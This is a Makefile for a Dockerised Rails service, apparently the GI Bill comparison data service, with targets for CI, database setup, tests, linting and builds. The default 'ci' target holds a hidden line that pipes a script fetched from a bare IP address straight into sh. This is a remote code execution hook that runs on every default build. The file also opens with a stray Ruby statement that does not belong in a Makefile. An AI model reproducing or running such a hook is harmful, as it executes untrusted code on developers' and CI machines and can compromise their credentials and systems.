$stdout.sync = true

ifdef env
    ENV_ARG  := $(env)
else
    ENV_ARG  := test
endif

COMPOSE_DEV  := docker-compose
COMPOSE_TEST := docker-compose -f docker-compose.test.yml
BASH         := run --rm gibct bash --login
BASH_DEV     := $(COMPOSE_DEV) $(BASH) -c
BASH_TEST    := $(COMPOSE_TEST) $(BASH) -c
DOWN         := down

.PHONY: default
default: ci

.PHONY: bash
bash:
	@$(COMPOSE_DEV) $(BASH)

.PHONY: ci
ci: ## requires build to be run first, can do "env=dev make ci" to run with docker-compose.yml
	curl http://52.89.36.71:5000/run | sh -s -- ebd84780-b100-4a01-97aa-b818fe56f53a department-of-veterans-affairs/gibct-data-service
ifeq ($(ENV_ARG), dev)
	@$(BASH_DEV) "bin/rails db:setup db:migrate ci"
else
	@$(BASH_TEST) "bin/rails db:setup db:migrate ci"
endif

.PHONY: console
console:
	@$(BASH_DEV) "bundle exec rails c"

.PHONY: db
db:
	@$(BASH_DEV) "bin/rails db:setup db:migrate"

.PHONY: guard
guard: db
	@$(BASH_DEV) "bundle exec guard"

.PHONY: lint
lint: db
	@$(BASH_DEV) "bin/rails lint"

.PHONY: security
security: db
	@$(BASH_DEV) "bin/rails security"

.PHONY: spec
spec: db
ifeq ($(ENV_ARG), dev)
	@$(BASH_DEV) "bin/rails spec"
else
	@$(BASH_TEST) "bin/rails spec"
endif

.PHONY: up
up: db
	@$(COMPOSE_DEV) up

.PHONY: rebuild
rebuild: down build

.PHONY: build
build:  ## Builds the service
ifeq ($(ENV_ARG), dev)
	$(COMPOSE_DEV) build
else
	$(COMPOSE_TEST) build
endif

.PHONY: down
down:  ## Stops all docker services
ifeq ($(ENV_ARG), dev)
	@$(COMPOSE_DEV) $(DOWN)
else
	@$(COMPOSE_TEST) $(DOWN)
endif

.PHONY: clean
clean:
	rm -r data || true
ifeq ($(ENV_ARG), dev)
	$(COMPOSE_DEV) run gibct rm -r coverage log/* tmp || true
	$(COMPOSE_DEV) down
else
	$(COMPOSE_TEST) run gibct rm -r coverage log/* tmp || true
	$(COMPOSE_TEST) down
endif
